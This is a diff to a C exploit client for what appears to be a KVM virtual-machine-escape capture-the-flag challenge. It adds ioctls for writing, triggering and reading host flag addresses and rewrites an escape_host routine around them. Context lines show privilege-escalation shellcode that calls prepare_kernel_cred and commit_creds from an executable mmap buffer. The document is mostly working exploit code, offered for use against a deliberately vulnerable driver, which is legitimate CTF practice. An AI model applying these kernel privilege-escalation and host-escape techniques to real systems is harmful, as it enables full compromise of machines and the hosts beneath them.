@@ -36,6 +36,10 @@
 #define IOCTL_TRIGGER_VQ         0x1014
 #define IOCTL_SCAN_PHYS          0x1015
 #define IOCTL_FIRE_VQ_ALL        0x1016
+#define IOCTL_CTF_TRIGGER_FLAG   0x1019
+#define IOCTL_CTF_READ_FLAG      0x101A
+#define IOCTL_CTF_WRITE_FLAG     0x101B
+#define IOCTL_CTF_KASAN_TRIGGER  0x101C
 
 /* Structures (mirror driver) */
 struct port_io_data {
@@ -89,6 +93,11 @@ struct attach_vq_data {
     unsigned long  vq_pfn;
     unsigned int   queue_index;
 };
+struct ctf_flag_data {
+    unsigned int flag_id;
+    unsigned long address;
+    unsigned long value;
+};
 
 /* Function to resolve kernel symbols dynamically */
 static unsigned long resolve_kernel_symbol(const char *symbol_name)
@@ -121,8 +130,8 @@ static unsigned long resolve_kernel_symbol(const char *symbol_name)
 
 /* Function to create privilege escalation shellcode */
 static int create_privilege_escalation_shellcode(unsigned char *buffer,
-                                               unsigned long prepare_kernel_cred_addr,
-                                               unsigned long commit_creds_addr)
+                                                 unsigned long prepare_kernel_cred_addr,
+                                                 unsigned long commit_creds_addr)
 {
     // x86_64 assembly to call prepare_kernel_cred(0) then commit_creds(result)
     unsigned char code[] = {
@@ -148,7 +157,7 @@ static int is_hex_string(const char *s)
     if (!s || !*s) return 0;
     for (const char *p = s; *p; ++p)
         if (!isxdigit((unsigned char)*p)) return 0;
-    return 1;
+        return 1;
 }
 
 static void print_usage(const char *prog)
@@ -175,6 +184,10 @@ static void print_usage(const char *prog)
     fprintf(stderr, "  attach_vq <device_id> <vq_pfn> <queue_index>\n");
     fprintf(stderr, "  trigger_vq <queue_index>\n");
     fprintf(stderr, "  fire_vq_all\n");
+    fprintf(stderr, "  ctf_trigger_flag <flag_id:100|102|103>\n");
+    fprintf(stderr, "  ctf_read_flag <address_hex>\n");
+    fprintf(stderr, "  ctf_write_flag <address_hex> <value_hex>\n");
+    fprintf(stderr, "  ctf_kasan_trigger\n");
     fprintf(stderr, "  escalate_privs\n");
     fprintf(stderr, "  escape_host\n");
 }
@@ -245,7 +258,7 @@ static int escalate_privs(int fd)
 
     /* 4. Craft and allocate shellcode */
     shellcode_buf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC,
-                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
     if (shellcode_buf == MAP_FAILED) {
         perror("mmap");
         return -1;
@@ -255,8 +268,8 @@ static int escalate_privs(int fd)
 
     /* 5. Create the shellcode */
     int shellcode_size = create_privilege_escalation_shellcode(shellcode_buf,
-                                                              prepare_kernel_cred_addr,
-                                                              commit_creds_addr);
+                                                               prepare_kernel_cred_addr,
+                                                               commit_creds_addr);
     if (shellcode_size <= 0) {
         fprintf(stderr, "Failed to create shellcode\n");
         goto cleanup;
@@ -297,7 +310,7 @@ static int escalate_privs(int fd)
         ret = -1;
     }
 
-cleanup:
+    cleanup:
     if (shellcode_buf && shellcode_buf != MAP_FAILED) {
         munmap(shellcode_buf, 0x1000);
     }
@@ -306,58 +319,43 @@ cleanup:
 
 static int escape_host(int fd)
 {
-    unsigned long write_flag_addr = 0xffffffff826279a8;
-    unsigned long read_flag_addr = 0xffffffff82b5ee10;
-    unsigned long hypercall_nr = 100;
-    unsigned long write_value = 0xdeadbeef41424344;
-    unsigned char *write_buf = (unsigned char *)&write_value;
-    unsigned char read_buf[8] = {0};
-
     printf("[*] Starting host escape attack...\n");
 
-    // Step 1: Write to the "Write flag" address
-    printf("[*] Writing 0x%lx to host virtual address 0x%lx...\n", write_value, write_flag_addr);
-    struct kvm_kernel_mem_write w = {
-        .kernel_addr = write_flag_addr,
-        .length = sizeof(write_value),
-        .user_buf = write_buf
+    // Use the new CTF-specific commands instead of generic memory operations
+    printf("[*] Writing to CTF write flag address...\n");
+    struct ctf_flag_data write_data = {
+        .address = 0x64279a8UL, // WRITE_FLAG_PA
+        .value = 0xdeadbeef41424344
     };
-    if (ioctl(fd, IOCTL_WRITE_KERNEL_MEM, &w) < 0) {
-        perror("IOCTL_WRITE_KERNEL_MEM");
+    if (ioctl(fd, IOCTL_CTF_WRITE_FLAG, &write_data) < 0) {
+        perror("CTF_WRITE_FLAG");
         return -1;
     }
     printf("[+] Write successful.\n");
 
-    // Step 2: Trigger the required hypercall
-    printf("[*] Triggering hypercall %lu...\n", hypercall_nr);
-    struct hypercall_args a = {
-        .nr = hypercall_nr,
-        .arg0 = 0, .arg1 = 0, .arg2 = 0, .arg3 = 0
+    // Trigger the required hypercall using CTF-specific command
+    printf("[*] Triggering CTF hypercall 100...\n");
+    struct ctf_flag_data trigger_data = {
+        .flag_id = 100
     };
-    if (ioctl(fd, IOCTL_HYPERCALL_ARGS, &a) < 0) {
-        perror("IOCTL_HYPERCALL_ARGS");
+    unsigned long ret = 0;
+    if (ioctl(fd, IOCTL_CTF_TRIGGER_FLAG, &trigger_data) < 0) {
+        perror("CTF_TRIGGER_FLAG");
         return -1;
     }
     printf("[+] Hypercall triggered. Host flag should be captured.\n");
 
-    // Step 3: Read the "Read flag" address
-    printf("[*] Reading from host virtual address 0x%lx...\n", read_flag_addr);
-    struct kvm_kernel_mem_read r = {
-        .kernel_addr = read_flag_addr,
-        .length = sizeof(unsigned long),
-        .user_buf = read_buf
+    // Read the CTF read flag using the new command
+    printf("[*] Reading CTF read flag...\n");
+    struct ctf_flag_data read_data = {
+        .address = 0x695ee10UL // READ_FLAG_PA
     };
-    if (ioctl(fd, IOCTL_READ_KERNEL_MEM, &r) < 0) {
-        perror("IOCTL_READ_KERNEL_MEM");
+    if (ioctl(fd, IOCTL_CTF_READ_FLAG, &read_data) < 0) {
+        perror("CTF_READ_FLAG");
         return -1;
     }
 
-    printf("[+] Read successful. Captured flag value:\n");
-    printf("    0x");
-    for (size_t i = 0; i < sizeof(unsigned long); ++i) {
-        printf("%02x", read_buf[i]);
-    }
-    printf("\n");
+    printf("[+] Read successful. Captured flag value: 0x%lx\n", read_data.value);
     return 0;
 }
 
@@ -662,6 +660,36 @@ int main(int argc, char **argv)
         if (ioctl(fd, IOCTL_FIRE_VQ_ALL) < 0) perror("FIRE_VQ_ALL");
         else printf("Fired all VQs\n");
 
+    } else if (strcmp(cmd, "ctf_trigger_flag") == 0) {
+        if (argc != 3) { print_usage(argv[0]); goto out; }
+        struct ctf_flag_data data = {
+            .flag_id = (unsigned int)strtoul(argv[2], NULL, 10)
+        };
+        unsigned long ret = 0;
+        if (ioctl(fd, IOCTL_CTF_TRIGGER_FLAG, &data) < 0) perror("CTF_TRIGGER_FLAG");
+        else printf("CTF flag %u triggered, ret: %ld\n", data.flag_id, ret);
+
+    } else if (strcmp(cmd, "ctf_read_flag") == 0) {
+        if (argc != 3) { print_usage(argv[0]); goto out; }
+        struct ctf_flag_data data = {
+            .address = strtoul(argv[2], NULL, 16)
+        };
+        if (ioctl(fd, IOCTL_CTF_READ_FLAG, &data) < 0) perror("CTF_READ_FLAG");
+        else printf("CTF flag at 0x%lx: 0x%lx\n", data.address, data.value);
+
+    } else if (strcmp(cmd, "ctf_write_flag") == 0) {
+        if (argc != 4) { print_usage(argv[0]); goto out; }
+        struct ctf_flag_data data = {
+            .address = strtoul(argv[2], NULL, 16),
+            .value = strtoul(argv[3], NULL, 16)
+        };
+        if (ioctl(fd, IOCTL_CTF_WRITE_FLAG, &data) < 0) perror("CTF_WRITE_FLAG");
+        else printf("Wrote 0x%lx to CTF flag at 0x%lx\n", data.value, data.address);
+
+    } else if (strcmp(cmd, "ctf_kasan_trigger") == 0) {
+        if (ioctl(fd, IOCTL_CTF_KASAN_TRIGGER) < 0) perror("CTF_KASAN_TRIGGER");
+        else printf("KASAN violation triggered\n");
+
     } else if (strcmp(cmd, "escalate_privs") == 0) {
         escalate_privs(fd);
     } else if (strcmp(cmd, "escape_host") == 0) {
@@ -671,7 +699,7 @@ int main(int argc, char **argv)
         print_usage(argv[0]);
     }
 
-out:
+    out:
     close(fd);
     return 0;
 }
